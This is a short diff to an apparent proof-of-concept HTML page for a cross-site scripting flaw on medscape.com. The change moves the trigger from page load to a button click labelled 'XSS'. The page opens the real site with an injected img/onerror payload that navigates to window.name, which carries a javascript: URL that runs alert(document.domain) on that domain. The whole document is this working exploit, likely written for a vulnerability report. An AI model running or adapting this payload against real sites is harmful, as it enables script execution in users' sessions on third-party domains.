@@ -1,1 +1,2 @@
-<script>open('https://www.medscape.com/?"><img%20src=x%20onerror="location/**/=window.name', 'javascript:alert(document.domain)')</script>
+<button id="test">XSS</button>
+<script>document.querySelector('#test').onclick = () => open('https://www.medscape.com/?"><img%20src=x%20onerror="location/**/=window.name', 'javascript:alert(document.domain)')</script>
